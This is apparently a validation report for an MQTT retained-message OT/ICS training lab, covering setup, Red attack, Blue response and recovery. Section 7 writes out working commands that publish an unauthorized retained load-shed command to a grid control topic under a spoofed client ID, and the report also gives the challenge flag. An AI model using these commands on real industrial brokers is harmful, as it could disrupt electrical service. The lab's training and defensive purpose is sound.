**MQTT Retained Demand-Response**

Complete Technical and Non-Technical Challenge Report

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/MQTT-Retained-Demand-Response/media/image7.png" title="MQTT retained demand-response challenge topology showing Red, challenge host, Blue, and validated 80-to-52-to-80 MW lifecycle." style="width:6.55in;height:3.11125in" alt="MQTT retained demand-response challenge topology showing Red, challenge host, Blue, and validated 80-to-52-to-80 MW lifecycle." />

| **Document Attribute** | **Validated Value** |
|----|----|
| Release | v1.0.2 Tested Final |
| Category | OT/ICS Â· MQTT Â· Demand Response |
| Difficulty | Intermediate |
| Primary Mapping | T1692.001 Unauthorized Message â€” Command Message |
| Target Platform | Ubuntu Server 22.04 LTS x86_64 |
| Document Status | Complete; original package manually tested end to end |

Prepared for technical and management handover

22 July 2026

# Document Control and Handover Status

| **Field** | **Value** |
|----|----|
| Challenge | MQTT Retained Demand-Response Command |
| Package under test | MQTT-Retained-Demand-Response.zip |
| Original package SHA-256 | 8c6ac557675eeb8f2f2b5d6df04746916d9c9e308d3efb8545c1dd2787fad093 |
| Validation host | Ubuntu 22.04.5 LTS x86_64; hostname kaif---testvm |
| Red workstation | Kali GNU/Linux Rolling 2026.1 under WSL; x86_64 |
| Validation date | 21â€“22 July 2026 |
| Validation scope | Package integrity, setup, baseline, manual attack, packet evidence, Blue investigation, evidence collection, containment, recovery, reset, and service availability |
| Final status | PASS â€” technically validated and documented for handover |


**Authorized-use statement

**This report documents an intentionally vulnerable OT/ICS training environment. All commands and traffic captures were executed against the authorized challenge target only. Do not reuse the attack workflow against systems without explicit permission.


# Contents

- 1\. Executive Summary

- 2\. Complete Non-Technical Storyline

- 3\. Technical Scenario and Vulnerability

- 4\. Architecture, Components, Ports, Topics, Services, and Paths

- 5\. Three-Module Design and Linkage Verification

- 6\. Prerequisites and Deployment

- 7\. Red Module â€” Participant Workflow

- 8\. Blue Module â€” Incident Response Workflow

- 9\. Red-vs-Blue Module â€” Concurrent Exercise Workflow

- 10\. Wireshark SSH Remote Capture and Packet Evidence

- 11\. Manual Runtime Validation Results

- 12\. Blue Detection, Attribution, and Timeline

- 13\. Evidence Preservation and Integrity

- 14\. Containment

- 15\. Recovery, Reset, and Service Availability

- 16\. TTP Mapping

- 17\. Assessment and Reporting Mapping

- 18\. Security Recommendations

- 19\. Known Limitations and Operational Notes

- 20\. Module-by-Module Package Contents

- 21\. Operator Quick Reference and Troubleshooting

- 22\. Final Acceptance Matrix

- Appendix A. Exact Validated Commands

- Appendix B. Hashes and Package Integrity

- Appendix C. Validated Evidence Values

# 1. Executive Summary

The MQTT Retained Demand-Response challenge is a real-protocol OT/ICS exercise built around Eclipse Mosquitto and genuine MQTT retained-message behavior. A public listener on TCP/1883 permits an external client to read Zone-3 telemetry and write the demand-response command topic. The industrial controller uses a separate localhost listener on TCP/1884 and intentionally alternates between online and offline windows.

During the validated attack, the Red participant waited for the controller to enter its offline window and published a QoS 1 retained message containing {"shed":1} to grid/dr/zone3/cmd using client identifier contractor-laptop-07. The broker stored the command after the publisher disconnected. When the controller reconnected, it immediately received and executed the retained instruction.

The process changed from NORMAL at 80 MW to LOAD_SHEDDING_ACTIVE at 52 MW. The 28 MW reduction occurred while authorized_shed remained false, proving that the process action was unauthorized. Blue evidence correlated the publisher client identifier, NAT-visible source address, source port, topic, payload, QoS, retained status, broker time, controller receipt, command execution, and process change.

The Blue workflow preserved logs, runtime state, packet capture, socket/process snapshots, retained-command state, and a SHA-256 manifest before containment. Blue stopped the controller, cleared the malicious retained message, published the safe retained value {"shed":0}, restarted the controller, and restored NORMAL operation at 80 MW. The packaged reset script and final service-availability test also passed.

| **Acceptance Area** | **Validated Result** |
|----|----|
| Outer and nested package checksums | PASS |
| Original setup.sh on clean Ubuntu VM | PASS â€” SETUP_SUCCESS |
| Shared Mosquitto runtime | PASS â€” public 1883, internal 1884 |
| Normal process baseline | PASS â€” NORMAL / 80 MW |
| Manual Red attack | PASS â€” retained {"shed":1} |
| Industrial process impact | PASS â€” 52 MW served / 28 MW reduction |
| Blue alert and attribution | PASS â€” client, source, topic, payload, QoS, retain |
| Wireshark live packet evidence | PASS â€” SSH remote capture on TCP/1883 |
| Evidence collection | PASS â€” timestamped case and SHA-256 manifest |
| Containment and recovery | PASS â€” malicious retained state cleared; safe value restored |
| Packaged reset and services | PASS â€” RESET_SUCCESS and all seven services active |


**Final handover conclusion

**The challenge is technically working, all three modules are correctly linked to the same verified runtime, and the package is suitable for delivery after insertion of this standalone Word report at the outer package root.


# 2. Complete Non-Technical Storyline

## 2.1 The real-world story

A regional grid operator uses demand-response automation to reduce electrical load during controlled operational events. Field and supervisory applications communicate through MQTT. The command topic stores the latest instruction as a retained message so a controller that reconnects can immediately learn the current requested state.

This reliability feature becomes dangerous when the public broker is misconfigured. An external client can write directly to the command topic without authentication. The attacker does not need to stay connected. A single retained message survives disconnection and waits inside the broker. When the controller comes back online, the stored instruction is delivered automatically.

## 2.2 What Red Team does

1\. Receives only the target IP and a black-box mission.

2\. Discovers the MQTT broker and monitoring interface.

3\. Reads live MQTT topics and identifies the retained command topic.

4\. Observes that the controller periodically disconnects.

5\. Publishes an unauthorized retained load-shed instruction while the controller is offline.

6\. Confirms the command remains stored and verifies the 80 MW to 52 MW process impact.

7\. Records the protocol, topic, message property, impact, and final finding-based flag.

## 2.3 What Blue Team does

1\. Confirms the industrial environment and process impact.

2\. Reviews the high-severity retained-command alert.

3\. Attributes the publisher using client ID, source network details, broker timestamps, and packet capture.

4\. Correlates broker, controller, execution-timeline, audit, telemetry, and process-truth evidence.

5\. Preserves evidence and calculates SHA-256 hashes before changing the system.

6\. Stops the controller, clears the malicious retained state, and restricts unauthorized access.

7\. Publishes the approved safe command, restarts the controller, and validates NORMAL / 80 MW operation.

## 2.4 What happens in Red-vs-Blue

Red and Blue work against the same live target. Red creates the incident through external MQTT interaction; Blue sees the actual resulting logs, alerts, network traffic, controller behavior, and process effect. Blue must preserve evidence before containment, while Red must avoid destructive actions outside the approved mission. The exercise ends only after service availability and the safe process baseline are restored.

## 2.5 Why the scenario matters

- Retained messages are useful for reliability but can preserve malicious control state.

- Anonymous access and broad topic ACLs can turn a messaging broker into an industrial control path.

- Process integrity can fail even while every service remains technically available.

- Client IDs are evidence but are not strong authentication by themselves.

- Incident responders must preserve volatile and persistent broker evidence before clearing retained state.

- Network address translation can cause Blue to observe a gateway or NAT address rather than the workstationâ€™s local address.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/MQTT-Retained-Demand-Response/media/image8.png" title="Validated retained-message attack, detection, containment, and recovery lifecycle." style="width:6.55in;height:2.69706in" alt="Validated retained-message attack, detection, containment, and recovery lifecycle." />

Figure 1 â€” End-to-end retained-command attack, detection, containment, and recovery lifecycle

The lifecycle is persistent by design: the dangerous command remains available until Blue explicitly clears or replaces the retained message.

# 3. Technical Scenario and Vulnerability

## 3.1 Vulnerability definition

The intentional weakness is an externally reachable MQTT listener that allows anonymous read access to Zone-3 topics and anonymous write access to the industrial command topic. The ACL grants write permission to grid/dr/zone3/cmd. Because Mosquitto persistence is enabled and the attacker publishes with the retained flag, the broker saves the malicious command and later delivers it to the reconnecting controller.

## 3.2 Why this occurs in real environments

- Commissioning teams enable anonymous access temporarily and the configuration remains in production.

- A public telemetry listener and an internal control listener share the same broker and retained database.

- Topic ACLs are broad because operational teams prioritize rapid integration and uptime.

- Client identifiers are treated as trusted identity even though they are supplied by the connecting client.

- Retained control messages are used for state synchronization without signatures, freshness checks, sequence validation, or authorization metadata.

- Monitoring focuses on broker availability rather than whether a process command is legitimate.

## 3.3 Technical attack path

1\. Discover TCP/1883 and TCP/8090.

2\. Query the HMI API and record the safe 80 MW baseline.

3\. Subscribe to \# and identify grid/dr/zone3/cmd plus the safe retained payload {"shed":0}.

4\. Observe controller_online alternating between true and false.

5\. While false, connect as contractor-laptop-07 and publish {"shed":1} with QoS 1 and retain=true.

6\. Verify the broker immediately returns the retained malicious command to a new subscriber.

7\. Wait for zone3-dr-controller to reconnect on the internal listener.

8\. The controller receives the retained command and updates controller-request.json.

9\. The grid simulator applies unauthorized shedding and changes served load to 52 MW.

10\. The audit service correlates the broker publisher with the observed command and raises a HIGH alert.

## 3.4 Security impact

| **Impact Dimension** | **Observed Effect** |
|----|----|
| Process integrity | Unauthorized load shedding executed |
| Electrical service | Served load reduced from 80 MW to 52 MW |
| Operational loss | 28 MW reduction |
| Persistence | Malicious state re-executed after later controller reconnects |
| Attribution | Client ID, source address/port, topic, QoS, retain flag and timestamps recorded |
| Availability | Services remained up; the incident is an integrity failure, not a total outage |

## 3.5 Package mapping

The packaged Attack TTP maps the incident to tactic impair-process-control and technique T1692.001, named Unauthorized Message â€” Command Message. The service-availability TTP separately uses discovery metadata to confirm listeners, services, MQTT delivery, and HMI availability.

# 4. Architecture, Components, Ports, Topics, Services, and Paths

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/MQTT-Retained-Demand-Response/media/image7.png" title="MQTT challenge topology showing public and internal broker listeners, Red traffic, Blue evidence, and process outcome." style="width:6.55in;height:3.11125in" alt="MQTT challenge topology showing public and internal broker listeners, Red traffic, Blue evidence, and process outcome." />

Figure 2 â€” Challenge topology and evidence flow

The public listener supports participant interaction. The localhost listener isolates the controller, telemetry, and audit clients from direct remote access while using the same persistent Mosquitto broker.

## 4.1 Component inventory

| **Component** | **Role** | **Implementation** |
|----|----|----|
| Public MQTT listener | Participant-facing read/write path | Eclipse Mosquitto on 0.0.0.0:1883 |
| Internal MQTT listener | Controller, telemetry and audit path | Eclipse Mosquitto on 127.0.0.1:1884 |
| Grid simulator | Maintains process truth and applies requested shedding | Python service |
| Demand-response controller | Subscribes to retained command and cycles online/offline | Python Paho MQTT client |
| Telemetry publisher | Publishes process and controller status | Python Paho MQTT client |
| Broker audit service | Correlates Mosquitto logs with command observations | Python Paho MQTT client + native log parser |
| HMI/API | Displays process status and health | Python ThreadingHTTPServer on 8090 |
| Packet capture | Records MQTT network traffic | tcpdump service writing PCAP |

## 4.2 Ports and exposure

| **Port** | **Bind** | **Purpose** | **Participant Exposure** |
|----|----|----|----|
| 22/TCP | Server interface | Administration / Wireshark SSH remote capture | Restricted to approved administration sources |
| 1883/TCP | 0.0.0.0 | Public MQTT listener | Red and authorized participant networks |
| 1884/TCP | 127.0.0.1 | Internal MQTT listener | Local services only |
| 8090/TCP | 0.0.0.0 | HMI and JSON status API | Participant and Blue monitoring |

## 4.3 MQTT topics

| **Topic** | **Producer / Consumer** | **Purpose** |
|----|----|----|
| grid/dr/zone3/cmd | External publisher; controller and audit subscribe | Retained demand-response command |
| grid/dr/zone3/telemetry | Telemetry publisher | Live grid telemetry |
| grid/dr/zone3/controller/status | Controller | Online/offline state |
| grid/dr/zone3/controller/state | Controller | Last command and active shed state |
| grid/dr/zone3/process/state | Telemetry publisher | Process truth for MQTT observers |

## 4.4 MQTT clients

| **Client ID**          | **Role**                                     |
|------------------------|----------------------------------------------|
| zone3-dr-controller    | Industrial demand-response controller        |
| zone3-telemetry        | Telemetry publisher                          |
| zone3-blue-audit       | Blue audit subscriber                        |
| contractor-laptop-07   | Validated unauthorized publisher identity    |
| retained-command-check | Red retained-message verification subscriber |
| zone3-blue-containment | Blue retained-message clearing client        |
| zone3-blue-recovery    | Blue safe-state recovery publisher           |

## 4.5 systemd services

- mqtt-dr-broker.service

- mqtt-dr-grid-simulator.service

- mqtt-dr-controller.service

- mqtt-dr-telemetry.service

- mqtt-dr-audit.service

- mqtt-dr-hmi.service

- mqtt-dr-capture.service

- mqtt-dr-lab.target

## 4.6 Runtime and evidence paths

/opt/ot-challenges/mqtt-retained-demand-response\
/var/lib/otlab/mqtt-retained-demand-response\
/var/log/otlab/mqtt-retained-demand-response\
/var/log/otlab/mqtt-retained-demand-response/evidence\
/var/log/otlab/mqtt-retained-demand-response/mqtt-traffic.pcap0

# 5. Three-Module Design and Linkage Verification

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/MQTT-Retained-Demand-Response/media/image9.png" title="Three module packages linked to a byte-identical common challenge core." style="width:6.55in;height:3.80719in" alt="Three module packages linked to a byte-identical common challenge core." />

Figure 3 â€” Role-specific packages linked to one byte-identical challenge core

Runtime equivalence was verified by hashing every common-core file and comparing the setup, dependency, and reset wrappers across Red, Blue, and Red-vs-Blue modules.

## 5.1 Linkage result

All three modules contain the same challenge-core. The common-core tree hash was identical across the three extracted module archives:

36d6c0aac9c8829c0710f540c06952a93d8bb5e2321d4a2e0be9f16fe6541fb3

The wrapper scripts are also byte-identical across all modules:

| **Wrapper** | **SHA-256** |
|----|----|
| setup.sh | 3cba500e2c2719d3ae04bf241e5daeeebc0d75e1f04e5cd53ba814ff25810181 |
| deps.sh | 7aa8b570087085e23ea67501b3f52f694e34f0376423941a48dd079b2370d1e7 |
| reset.sh | a02937c8ce27a3f7b6c8f223705eb88ee619cdcd40100639a8f51a222ce19bac |

## 5.2 What differs between modules

| **Module** | **Role-specific material** | **Deployment behavior** |
|----|----|----|
| Red | Red mission, Red assessment, Red writeup, optional attack helper, Setup/Attack TTPs | Installs the shared runtime |
| Blue | Blue mission, Blue assessment, Blue writeup, incident seeding script/TTP, evidence collector, Setup/Attack/Availability TTPs | Installs the shared runtime |
| Red-vs-Blue | Both role writeups/assessments, attack helper, evidence collector, INREP, SITREP, RED-REPORT, Setup/Attack/Availability TTPs | Installs the shared runtime |


**Deployment rule

**Do not install the Red, Blue, and Red-vs-Blue modules simultaneously on one VM. They intentionally use the same service names, ports, installation root, runtime state, logs, and reset behavior. Select one module per exercise VM.


## 5.3 Why one full runtime test is meaningful

Because the runtime core and wrappers are byte-identical, the successful clean deployment and manual end-to-end test of the Red-vs-Blue package validates the same service installation, MQTT broker configuration, process simulation, evidence generation, and reset implementation shipped in the standalone Red and Blue packages. Role-specific documentation and TTP files were additionally checked inside their respective archives.

# 6. Prerequisites and Deployment

## 6.1 Supported environment

| **Requirement** | **Value** |
|----|----|
| Operating system | Ubuntu Server 22.04 LTS |
| Architecture | x86_64 |
| Recommended resources | 2 vCPU, 4 GB RAM, 10 GB free disk |
| Network | TCP/22 for administration, 1883 for MQTT participants, 8090 for HMI |
| Red workstation | Kali/Linux with nmap, curl, jq and mosquitto-clients |
| Blue tools | systemctl, ss, jq, tcpdump/Wireshark, sha256sum, mosquitto-clients |

## 6.2 Server-side installation

cd MQTT-Retained-Demand-Response-\<Selected\>-Module\
chmod +x deps.sh setup.sh reset.sh\
sudo ./setup.sh

The setup wrapper invokes challenge-core/setup.sh. The core validates required files, installs dependencies, creates the otlab group and restricted mqttdr service account, removes any previous installation, installs runtime assets under /opt/ot-challenges, creates state and log directories, installs systemd units, starts the broker, publishes the safe retained baseline {"shed":0}, starts the target, waits for HMI readiness, and prints SETUP_SUCCESS.

## 6.3 Expected setup markers

DEPENDENCIES_INSTALLED_SUCCESSFULLY\
SETUP_SUCCESS

## 6.4 Initial availability checks

systemctl is-active mqtt-dr-lab.target\
sudo ss -lntp \| grep -E ':1883\|:1884\|:8090'\
curl -s http://127.0.0.1:8090/api/status \| jq .

## 6.5 Expected clean baseline

{\
"grid_condition": "NORMAL",\
"baseline_load_mw": 80,\
"served_load_mw": 80,\
"load_reduction_mw": 0,\
"shed_active": false,\
"authorized_shed": false\
}


**Controller status timing

**The controller intentionally remains online for 25 seconds and offline for 15 seconds. A single health query may therefore show controller_online=false even when the process is safely restored. Final validation should wait for an online window while also confirming NORMAL / 80 MW.


# 7. Red Module â€” Participant Workflow

## 7.1 Participant separation

The Red participant should receive only the target IP, the approved black-box mission in Description.md, exercise rules, and the assessment when appropriate. Do not provide internal topics, payloads, ports, service names, source files, writeups, TTP answer commands, credentials, or the final flag before completion.

## 7.2 Reconnaissance

export TARGET="TARGET_IP"\
nmap -Pn -sV -p- "\$TARGET"\
nmap -Pn -sV -p 1883,8090 "\$TARGET"

## 7.3 Baseline inspection

curl -s "http://\$TARGET:8090/health" \| jq .\
curl -s "http://\$TARGET:8090/api/status" \| jq .

## 7.4 MQTT enumeration

mosquitto_sub -h "\$TARGET" -p 1883 -t '#' -v

The live feed reveals the command topic grid/dr/zone3/cmd and the safe retained command {"shed":0}, together with controller status, controller state, telemetry, and process state.

## 7.5 Identify the offline window

watch -n 1 "curl -s http://\$TARGET:8090/api/status \| jq '{controller_online,grid_condition,served_load_mw,load_reduction_mw,shed_active}'"

## 7.6 Publish the unauthorized retained command

mosquitto_pub \\\
-h "\$TARGET" \\\
-p 1883 \\\
-i contractor-laptop-07 \\\
-q 1 \\\
-r \\\
-t 'grid/dr/zone3/cmd' \\\
-m '{"shed":1}'

## 7.7 Verify retained state

timeout 5 mosquitto_sub \\\
-h "\$TARGET" \\\
-p 1883 \\\
-i retained-command-check \\\
-t 'grid/dr/zone3/cmd' \\\
-C 1 \\\
-v

Expected response: grid/dr/zone3/cmd {"shed":1}.

## 7.8 Validate impact and derive the finding

curl -s "http://\$TARGET:8090/api/status" \| jq .

| **Field**         | **Incident Value**     |
|-------------------|------------------------|
| grid_condition    | LOAD_SHEDDING_ACTIVE   |
| served_load_mw    | 52                     |
| load_reduction_mw | 28                     |
| shed_active       | true                   |
| authorized_shed   | false                  |
| Final finding     | flag{52mw_28mw_shed_1} |

## 7.9 Red evidence checklist

- Service discovery identifying the participant-facing MQTT and HMI paths.

- Baseline HMI output showing NORMAL operation at 80 MW.

- MQTT enumeration showing the command topic and safe retained value.

- Wireshark CONNECT and PUBLISH frames identifying the Red client, topic, QoS, retained flag, and payload.

- Final HMI output showing 52 MW served load and 28 MW reduction.

## 7.10 Red completion criteria

- The unauthorized command was introduced only through the approved external interface.

- The retained value was independently verified after the publisher disconnected.

- The controller processed the stored command after reconnecting.

- No source files or server-side answer material were used during the solve.

- The participant recorded the exact finding flag from observed evidence.

# 8. Blue Module â€” Incident Response Workflow

## 8.1 Incident generation

In the standalone Blue module, the facilitator uses the packaged Red-Team-Attack-Script.sh or Attack TTP to seed the same authorized retained-message incident. The Blue participant should not receive the attack command or Red solution material.

## 8.2 Confirm services and process impact

systemctl is-active mqtt-dr-broker.service mqtt-dr-grid-simulator.service \\\
mqtt-dr-controller.service mqtt-dr-telemetry.service mqtt-dr-audit.service \\\
mqtt-dr-hmi.service mqtt-dr-capture.service\
sudo ss -lntp \| grep -E ':1883\|:1884\|:8090'\
curl -s http://127.0.0.1:8090/api/status \| jq .

## 8.3 Review and attribute the alert

sudo tail -n 1 \\\
/var/log/otlab/mqtt-retained-demand-response/retained-command-alerts.jsonl \| jq .

| **Alert Field**     | **Validated Value**                                |
|---------------------|----------------------------------------------------|
| event               | MQTT_COMMAND_OBSERVED / RETAINED_LOAD_SHED_COMMAND |
| severity            | HIGH                                               |
| publisher_client_id | contractor-laptop-07                               |
| source_ip           | 172.24.4.1 â€” NAT-visible source during test        |
| source_port         | 52658                                              |
| topic               | grid/dr/zone3/cmd                                  |
| payload             | {"shed":1}                                         |
| qos                 | 1                                                  |
| retain              | true                                               |
| correlated          | true                                               |

## 8.4 Build the incident timeline

sudo jq . /var/log/otlab/mqtt-retained-demand-response/audit.jsonl\
sudo jq . /var/log/otlab/mqtt-retained-demand-response/controller.jsonl\
sudo jq . /var/log/otlab/mqtt-retained-demand-response/execution-timeline.jsonl\
sudo jq . /var/log/otlab/mqtt-retained-demand-response/grid-truth.jsonl

Blue correlates the external publication, broker persistence, controller offline event, controller reconnection, retained command delivery, command execution, grid change, telemetry publication, and high-severity alert.

## 8.5 Packet investigation

sudo tcpdump -nn -tttt -r \\\
/var/log/otlab/mqtt-retained-demand-response/mqtt-traffic.pcap0 \\\
'tcp port 1883'\
\
sudo tcpdump -nn -A -r \\\
/var/log/otlab/mqtt-retained-demand-response/mqtt-traffic.pcap0 \\\
'tcp port 1883' \| grep -E 'contractor-laptop-07\|grid/dr/zone3/cmd\|shed'

# 9. Red-vs-Blue Module â€” Concurrent Exercise Workflow

## 9.1 Facilitator preparation

1\. Deploy one Red-vs-Blue module VM.

2\. Run setup and service availability before participant access.

3\. Give Red only the black-box mission and target IP.

4\. Give Blue only defensive access and the Blue mission.

5\. Confirm both teams record UTC timestamps and preserve process availability.

6\. Ensure Red does not receive writeups, assessments with answer keys, TTP commands, or source files.

## 9.2 Live exercise sequence

| **Phase** | **Red Activity** | **Blue Activity** | **Facilitator Check** |
|----|----|----|----|
| Start | Discover services and baseline | Monitor services, HMI, logs | NORMAL / 80 MW |
| Discovery | Subscribe and identify topics | Observe MQTT clients and status | No incident yet |
| Attack | Publish retained {"shed":1} | Detect and attribute command | HIGH alert generated |
| Impact | Confirm 52 MW | Correlate controller and process evidence | 28 MW reduction |
| Preservation | Record findings | Run collect-evidence.sh and verify hashes | Evidence path recorded |
| Containment | Cease further activity | Stop controller and clear retained state | Malicious value absent |
| Recovery | Validate target restoration | Publish {"shed":0}, restart, verify | NORMAL / 80 MW |
| Close | Complete RED-REPORT | Complete INREP/SITREP and final report | RESET_SUCCESS and services PASS |

## 9.3 Reporting files

- INREP.md â€” initial incident notification and immediate operational facts.

- SITREP.md â€” ongoing situation updates, scope, impact, actions, risks, and decisions.

- RED-REPORT.md â€” Red methodology, evidence, process impact, findings, and lessons.

- Red-Assessment.xlsx and Blue-Assessment.xlsx â€” role-specific 3 MCQ + 2 fill-in-the-blank assessments.

# 10. Wireshark SSH Remote Capture and Packet Evidence

## 10.1 Capture design

Windows Wireshark used the SSH remote capture extcap interface (sshdump) to run passwordless sudo tcpdump on the Ubuntu challenge host. The capture filter tcp port 1883 restricted collection to the external participant-facing MQTT listener. WSL/Kali generated the Red traffic. The server observed the NAT-visible source as 172.24.4.1 and the target as 203.0.0.161.

## 10.2 Baseline subscription evidence

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/MQTT-Retained-Demand-Response/media/image10.png" title="Windows Wireshark SSH remote capture showing MQTT CONNECT, SUBSCRIBE, retained PUBLISH, and DISCONNECT on TCP port 1883." style="width:6.55in;height:3.29933in" alt="Windows Wireshark SSH remote capture showing MQTT CONNECT, SUBSCRIBE, retained PUBLISH, and DISCONNECT on TCP port 1883." />

Figure 4 â€” Working SSH remote capture showing MQTT CONNECT, SUBSCRIBE, retained PUBLISH, and DISCONNECT on TCP/1883

This packet sequence was generated by a normal retained-command read. It proves that Windows Wireshark captured real external MQTT traffic from the WSL/Kali participant path through the server interface.

## 10.3 Unauthorized publisher identity

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/MQTT-Retained-Demand-Response/media/image11.png" title="Wireshark MQTT CONNECT packet showing client ID contractor-laptop-07 from the NAT-visible Red source to the public broker." style="width:6.55in;height:3.44055in" alt="Wireshark MQTT CONNECT packet showing client ID contractor-laptop-07 from the NAT-visible Red source to the public broker." />

Figure 5 â€” MQTT CONNECT from contractor-laptop-07 to the public broker

The expanded CONNECT packet shows source 172.24.4.1, destination 203.0.0.161, destination TCP/1883, MQTT v3.1.1, clean session, and client ID contractor-laptop-07. The source is the NAT-visible participant address recorded by the server.

## 10.4 Malicious retained PUBLISH

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/MQTT-Retained-Demand-Response/media/image12.png" title="Wireshark malicious MQTT PUBLISH to grid/dr/zone3/cmd with QoS 1 and retained flag set." style="width:6.55in;height:3.42615in" alt="Wireshark malicious MQTT PUBLISH to grid/dr/zone3/cmd with QoS 1 and retained flag set." />

Figure 6 â€” Red PUBLISH to grid/dr/zone3/cmd with QoS 1 and Retain set

The selected Red-to-server packet shows PUBLISH, QoS level 1, Retain set, topic grid/dr/zone3/cmd, and message bytes 7b2273686564223a317d. Those hexadecimal bytes decode to {"shed":1}.

## 10.5 Retained-command verification client

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/MQTT-Retained-Demand-Response/media/image13.png" title="Wireshark MQTT CONNECT from retained-command-check used to verify stored malicious broker state." style="width:6.55in;height:3.36637in" alt="Wireshark MQTT CONNECT from retained-command-check used to verify stored malicious broker state." />

Figure 7 â€” retained-command-check MQTT client connection used to verify broker persistence

A separate subscriber connects after the attacker has disconnected. The terminal command received grid/dr/zone3/cmd {"shed":1}, confirming that the broker retained the malicious command rather than relying on a continuously connected attacker.

## 10.6 Process impact

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/MQTT-Retained-Demand-Response/media/image14.png" title="Terminal HMI status showing controller online, load shedding active, 52 MW served load, and 28 MW reduction." style="width:6.55in;height:1.25722in" alt="Terminal HMI status showing controller online, load shedding active, 52 MW served load, and 28 MW reduction." />

Figure 8 â€” Live HMI/API impact after controller reconnection

The controller is online and the grid condition is LOAD_SHEDDING_ACTIVE. Served load is 52 MW, the reduction is 28 MW, and shed_active is true.

## 10.7 Recommended screenshot handling

- Keep the packet list, source/destination, protocol, destination port, and expanded MQTT details visible.

- Record the display filter in the screenshot.

- Save the capture as PCAPNG and preserve its SHA-256 separately from the document.

- Avoid relying only on screenshots; retain broker logs and controller JSONL evidence for correlation.

# 11. Manual Runtime Validation Results

## 11.1 Clean deployment

The original Red-vs-Blue module archive was extracted from the uploaded outer ZIP. Outer and nested checksum verification returned exit code 0. The original sudo ./setup.sh was then executed on a clean Ubuntu 22.04.5 LTS x86_64 VM. Dependency checks passed and setup ended with SETUP_SUCCESS.

## 11.2 Runtime services and listeners

| **Item**                       | **Validated State**         |
|--------------------------------|-----------------------------|
| mqtt-dr-lab.target             | active and enabled          |
| mqtt-dr-broker.service         | active                      |
| mqtt-dr-grid-simulator.service | active                      |
| mqtt-dr-controller.service     | active                      |
| mqtt-dr-telemetry.service      | active                      |
| mqtt-dr-audit.service          | active                      |
| mqtt-dr-hmi.service            | active                      |
| mqtt-dr-capture.service        | active                      |
| 0.0.0.0:1883                   | Mosquitto public listener   |
| 127.0.0.1:1884                 | Mosquitto internal listener |
| 0.0.0.0:8090                   | HMI/API listener            |

## 11.3 Baseline and discovery

| **Check** | **Result** |
|----|----|
| HMI baseline | NORMAL, baseline 80 MW, served 80 MW, no reduction |
| Retained safe command | grid/dr/zone3/cmd {"shed":0} |
| Controller cycle | Observed true and false states |
| Telemetry | Live controller, process and grid topics observed |
| External MQTT subscription | Successful from WSL/Kali to TCP/1883 |

## 11.4 Attack result

| **Check**             | **Result**                                          |
|-----------------------|-----------------------------------------------------|
| Publisher             | contractor-laptop-07                                |
| Topic                 | grid/dr/zone3/cmd                                   |
| Payload               | {"shed":1}                                          |
| QoS / retained        | 1 / true                                            |
| Retained verification | New subscriber immediately received malicious value |
| Controller action     | Executed retained command after reconnection        |
| Process result        | LOAD_SHEDDING_ACTIVE; 52 MW served; 28 MW reduction |
| Authorization         | authorized_shed=false                               |

## 11.5 Recovery result

| **Check** | **Result** |
|----|----|
| Evidence collector | Created /var/log/otlab/mqtt-retained-demand-response/evidence/20260721T185008Z |
| Malicious retained clear | No immediate {"shed":1} returned |
| Safe command | {"shed":0} published retained |
| Controller | Restarted and later returned online |
| Process recovery | NORMAL; 80 MW; zero reduction; shed_active=false |
| Packaged reset | RESET_SUCCESS |
| Final services | MQTT_SERVICE_AVAILABILITY=PASS |

# 12. Blue Detection, Attribution, and Timeline

## 12.1 Validated high-severity alert

{\
"broker_publish_epoch": 1784659422,\
"correlated": true,\
"event": "MQTT_COMMAND_OBSERVED",\
"observed_at": "2026-07-21T18:43:42.516057+00:00",\
"payload": "{\\shed\\:1}",\
"publisher_client_id": "contractor-laptop-07",\
"qos": 1,\
"retain": true,\
"severity": "HIGH",\
"shed": true,\
"source_ip": "172.24.4.1",\
"source_port": 52658,\
"topic": "grid/dr/zone3/cmd"\
}

## 12.2 Controller evidence

controller.jsonl recorded COMMAND_EXECUTED with payload {"shed":1}, qos=1, retain=true, the command topic, controller client ID zone3-dr-controller, and shed_active=true. Later entries recorded CONTROLLER_DISCONNECTED, CONTROLLER_OFFLINE_WINDOW, CONTROLLER_CONNECTED, and another COMMAND_EXECUTED after the next reconnect.

## 12.3 Persistence proof

The same malicious retained command executed again after later controller reconnects. This repeated delivery is critical: it proves the impact was caused by broker-retained state rather than a one-time transient network packet.

## 12.4 Timeline summary

| **UTC Time / Sequence** | **Event** | **Evidence** |
|----|----|----|
| Baseline | NORMAL / 80 MW / {"shed":0} | HMI API and MQTT subscription |
| 18:43:42 | Unauthorized retained command observed | retained-command-alerts.jsonl |
| Controller offline window | Attacker disconnected; command remained stored | Mosquitto persistence and retained verification |
| 18:46:48 | Controller reconnected and executed command | controller.jsonl and execution-timeline.jsonl |
| Post-execution | 52 MW served; 28 MW reduction | HMI/API and grid truth |
| 18:47:29 | Later reconnect re-executed retained command | controller and timeline logs |
| 18:50:08 | Evidence collection created | Timestamped evidence directory |
| Recovery | Safe retained value processed | HMI/API and retained read |
| Final | RESET_SUCCESS and services PASS | reset.sh and systemd checks |

## 12.5 Attribution caution

**NAT interpretation:** The host saw 172.24.4.1 because WSL traffic crossed NAT. Record it as the server-observed source and correlate it with the MQTT client ID, source port, capture times, and network design; do not treat the NAT address as unique workstation identity.

# 13. Evidence Preservation and Integrity

## 13.1 Packaged collection command

sudo ./collect-evidence.sh

The validated run created:

/var/log/otlab/mqtt-retained-demand-response/evidence/20260721T185008Z

## 13.2 Collected evidence categories

| **Category** | **Examples** |
|----|----|
| Runtime | controller-request.json, grid-truth.json, controller-state.json, audit-state.json |
| Logs | mosquitto.log, grid-truth.jsonl, controller.jsonl, telemetry.jsonl, audit.jsonl, retained-command-alerts.jsonl, execution-timeline.jsonl |
| Network | mqtt-traffic.pcap0, retained-command.txt, retained-command-error.txt |
| System | listening-tcp-sockets.txt, process-list.txt, collection-time.txt |
| Integrity | SHA256SUMS |

## 13.3 Integrity behavior

